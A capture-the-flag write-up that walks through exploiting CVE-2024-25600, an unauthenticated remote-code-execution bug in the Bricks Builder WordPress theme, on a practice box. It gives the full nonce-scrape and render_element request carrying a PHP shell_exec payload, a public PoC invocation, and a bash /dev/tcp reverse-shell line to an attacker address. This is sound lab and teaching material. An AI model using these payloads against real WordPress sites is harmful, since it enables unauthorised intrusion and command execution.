# bricks.thm — CVE-2024-25600 (Bricks Builder unauthenticated RCE)

Reconstructed from `nmaplog-1.log` + `thm_brickslist.txt` (own session) and cross-checked
against public write-ups for the same room (TryHack3M: Bricks Heist). One vector gets you
the foothold — everything below is that single path, start to flag.

## 1. Recon

```bash
echo "<TARGET_IP> bricks.thm" | sudo tee -a /etc/hosts

sudo nmap -A -T5 -sC -sV --top-ports=1000 bricks.thm
```

Results (`nmaplog-1.log`):

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 8.2p1 | nothing exploitable, no creds |
| 80 | Python http.server / WebSockify | noVNC-style proxy, dead end for the web vector |
| 443 | Apache, TLS | `Brick by Brick` — WordPress 6.5, `robots.txt` discloses `/wp-admin/` |
| 3306 | MySQL | unauthorized, not directly reachable |

The interesting service is 443: WordPress + `robots.txt` confirming a standard WP install.

## 2. Fingerprint WordPress

```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

Findings:
- WordPress **6.5**
- Theme: **Bricks** (bricksbuilder.io), version **1.9.5**, confirmed via `style.css`
- `xmlrpc.php` reachable, `readme.html` present, wp-cron reachable — all red herrings, no version-specific vuln used
- No plugins found — the theme itself is the attack surface

Bricks Builder **≤ 1.9.6** is vulnerable to **CVE-2024-25600**, CVSS 9.8, unauthenticated RCE. 1.9.5 is in range. This is the only vector needed.

## 3. The vulnerability

The theme registers a REST route `wp-json/bricks/v1/render_element` used by its live page
editor to render an element server-side. Element types that support a "Query Editor" (e.g.
`container`, `carousel`) or the raw "Code" element (`executeCode`) pass attacker-supplied
PHP straight into `eval()` inside `prepare_query_vars_from_settings()` — no capability check
on the callback beyond a nonce.

The nonce is meant to gate this to logged-in editors, but it's emitted directly into the
**unauthenticated** homepage's inline JS:

```js
var bricksData = {
    "ajaxUrl": "https://bricks.thm/wp-admin/admin-ajax.php",
    "restApiUrl": "https://bricks.thm/wp-json/bricks/v1/",
    "nonce": "dce9f95a2a",
    "postId": "0"
};
```

So: scrape the nonce from `/` (or any published post), then POST a crafted `element` to
`render_element`. No auth, no login, no brute force. That's the whole bug.

## 4. Exploit

Any of the public PoCs work the same way; the one referenced in the session's own history
was `CVE-2024-25600.py` (K3ysTr0K3R). A cleaner reference implementation
([CVE-2024-15600-enc-py.enc](./CVE-2024-15600-enc-py.enc))
shows the exact request shape:

```
GET  https://bricks.thm/                       -> scrape nonce from bricksData.nonce

POST https://bricks.thm/wp-json/bricks/v1/render_element
Content-Type: application/json

{
  "postId": "1",
  "nonce": "<scraped nonce>",
  "element": {
    "name": "code",
    "settings": {
      "executeCode": "true",
      "code": "<?php echo \"START\"; echo shell_exec(\"id\"); echo \"END\"; ?>"
    }
  }
}
```

The response body (or the thrown-exception message, if using the `container`/`carousel`
query-editor variant instead of the `code` element) contains the command output between the
markers. Wrap that in a loop and you have a pseudo-shell — every "command" is really its own
unauthenticated HTTP POST, there's no persistent session.

```bash
source thmenv/bin/activate
pip install requests beautifulsoup4 rich prompt_toolkit alive_progress   # PoC deps
python3 CVE-2024-25600.py --url https://bricks.thm/
```

Confirmed vulnerable, shell opened as `apache`, landed in `/data/www/default` (the docroot;
maps to `/var/www/html` on the box).

## 5. Flag

```
Shell> ls
650c844110baced87e1606453b93f22a.txt
index.php
...

Shell> cat 650c844110baced87e1606453b93f22a.txt
THM{fl4g_650c844110baced87e1606453b93f22a}
```
(session capture shows `fl46` instead of `fl4g` — almost certainly a transcription slip when
the terminal output was copied; the hash suffix matches the documented answer key exactly, so
treat `fl4g` as correct if the platform rejects the other spelling.)

## 6. Why the reverse shell attempt failed

The session then tried:
```
bash -c 'exec bash -i &>/dev/tcp/<attacker_ip>/9586 <&1'
```
sent as another RCE command — and it timed out (`ReadTimeoutError`). This isn't a second
vector, it's just egress filtering: outbound TCP from the box to your listener is blocked, so
you never get a real interactive shell — you stay on the HTTP request/response "shell" the
whole time. That's expected for this box; it doesn't need to work for the flag.

## What this isn't

No SQLi, no auth bypass on `/wp-login.php`, no XML-RPC pingback abuse, no phpMyAdmin creds —
all were visible in recon (`robots.txt`, wpscan output) but are decoys. `/wp-admin/` and
`phpmyadmin/` are exposed but never touched; the entire foothold is the one unauthenticated
`render_element` REST call above.

## Loose thread in the captured log

`thm_brickslist.txt` also has a long tail of `[*] Miner()` lines and an `ID: <hex>` blob
starting around the point the reverse shell attempt failed. That's not part of this
exploitation chain — it's the start of the room's **post-exploitation** stage (a disguised
cryptominer running as `ubuntu.service` / binary `nm-inet-dialog`, logging to
`/lib/NetworkManager/inet.conf`, wallet address hidden as hex→base64→base64→base64 in that log,
tied by transaction history to an OFAC-sanctioned LockBit wallet). If you want that part
written up too, say so — it's a separate investigation from the RCE foothold above, not a
second exploitation vector.

## References

- [K3ysTr0K3R/CVE-2024-25600-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
- [Chocapikk/CVE-2024-25600](https://github.com/Chocapikk/CVE-2024-25600)
- [WPScan vulnerability entry — Bricks < 1.9.6.1](https://wpscan.com/vulnerability/afea4f8c-4d45-4cc0-8eb7-6fa6748158bd/)